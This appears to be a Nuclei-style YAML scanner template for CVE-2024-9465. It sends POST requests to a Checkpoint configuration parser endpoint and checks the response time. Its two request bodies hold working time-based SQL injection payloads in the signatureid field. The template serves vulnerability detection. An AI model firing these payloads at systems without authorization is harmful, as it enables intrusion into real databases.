id: CVE-2024-9465-checkpoint-sqli

info:
  name: Time-Based SQL Injection in Checkpoint
  author: mustafaakalin
  severity: critical
  description: |
    This template detects time-based SQL Injection vulnerability in the Checkpoint configuration parser.
  tags: sqli, time-based, blind

requests:
  - method: POST
    path:
      - "{{BaseURL}}/bin/configurations/parsers/Checkpoint/CHECKPOINT.php"

    headers:
      Content-Type: application/x-www-form-urlencoded

    body: |
      action=import&type=test&project=pandbRBAC&signatureid=1' OR IF(1=1, SLEEP(7), 0) -- -

    matchers:
      - type: status
        status:
          - 200

      - type: dsl
        dsl:
          - "duration >= 7 && duration <= 16"  # Yanıt süresi kontrolü

  - method: POST
    path:
      - "{{BaseURL}}/bin/configurations/parsers/Checkpoint/CHECKPOINT.php"

    headers:
      Content-Type: application/x-www-form-urlencoded

    body: |
      action=import&type=test&project=pandbRBAC&signatureid=1' AND (SELECT 1 FROM (SELECT(SLEEP(7)))a) -- -

    matchers:
      - type: status
        status:
          - 200

      - type: dsl
        dsl:
          - "duration >= 7 && duration <= 16"  # Yanıt süresi kontrolü
